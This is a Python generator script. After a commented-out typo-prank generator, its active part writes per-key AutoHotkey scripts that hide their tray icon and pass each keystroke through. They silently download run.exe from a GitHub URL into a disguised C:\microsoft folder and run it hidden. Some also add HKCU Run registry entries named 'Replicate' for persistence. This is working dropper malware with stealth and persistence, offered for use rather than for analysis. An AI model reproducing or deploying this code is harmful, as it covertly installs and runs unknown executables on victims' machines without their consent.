# Fat Fingering Compiler
'''
neighbors = {
    'q': ['w', 'a'],
    'w': ['q', 'a', 's', 'e'],
    'e': ['w', 's', 'd', 'r'],
    'r': ['e', 'd', 'f', 't'],
    't': ['r', 'f', 'g', 'y'],
    'y': ['t', 'g', 'h', 'u'],
    'u': ['y', 'h', 'j', 'i'],
    'i': ['u', 'j', 'k', 'o'],
    'o': ['i', 'k', 'l', 'p'],
    'p': ['o', 'l'],

    'a': ['q', 'w', 's', 'z'],
    's': ['a', 'w', 'e', 'd', 'x', 'z'],
    'd': ['s', 'e', 'r', 'f', 'c', 'x'],
    'f': ['d', 'r', 't', 'g', 'v', 'c'],
    'g': ['f', 't', 'y', 'h', 'b', 'v'],
    'h': ['g', 'y', 'u', 'j', 'n', 'b'],
    'j': ['h', 'u', 'i', 'k', 'n', 'm'],
    'k': ['j', 'i', 'o', 'l', 'm'],
    'l': ['k', 'o', 'p'],

    'z': ['a', 's', 'x'],
    'x': ['z', 's', 'd', 'c'],
    'c': ['x', 'd', 'f', 'v'],
    'v': ['c', 'f', 'g', 'b'],
    'b': ['v', 'g', 'h', 'n'],
    'n': ['b', 'h', 'j', 'm'],
    'm': ['n', 'j', 'k']
}

result = "#SingleInstance Force\n\nodds := 10\n\n"

for key in neighbors:
    adjacent = neighbors[key]
    result += "$" + key + '::{\n\trand := Random(1, odds)\n\tif (rand = 1) {\n\t\t'
    result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
    first = True
    for i in range(len(adjacent)):
        if not first:
            result += ' else '
        else:
            first = False
        result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
    result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
    result += '\n}\n'

    result += "$+" + key + '::{\n\trand := Random(1, odds)\n\tif (rand = 1) {\n\t\t'
    result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
    first = True
    for i in range(len(adjacent)):
        if not first:
            result += ' else '
        else:
            first = False
        result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
    result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
    result += '\n}\n'

with open("output.txt", "w") as file:
    file.write(result + "^Esc::ExitApp")
'''






# Tool compiler
letters = [
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
    'z', 'x', 'c', 'v', 'b', 'n', 'm',
]
others = [
    'LButton', 'RButton', 'Delete', 'Backspace', 'Space',
]

for letter in letters:
    result = '''#SingleInstance Ignore
#NoTrayIcon

$'''
    result += letter + r'''::{
    path := "C:\microsoft"
    Send "''' + letter + r'''"

    static lastRun := 0
    delay := 2000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
'''

    with open("../Public-AHK/" + letter + ".ahk", "w") as file:
        file.write(result)


for other in others:
    result = '''#SingleInstance Ignore
#NoTrayIcon

Run "C:\microsoft\\run.exe"

$'''
    result += other + r'''::{
    path := "C:\microsoft"
    Send "{''' + other + r'''}"
    RegWrite '"C:\microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"

    static lastRun := 0
    delay := 1000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
'''

    with open("../Public-AHK/" + other + ".ahk", "w") as file:
        file.write(result)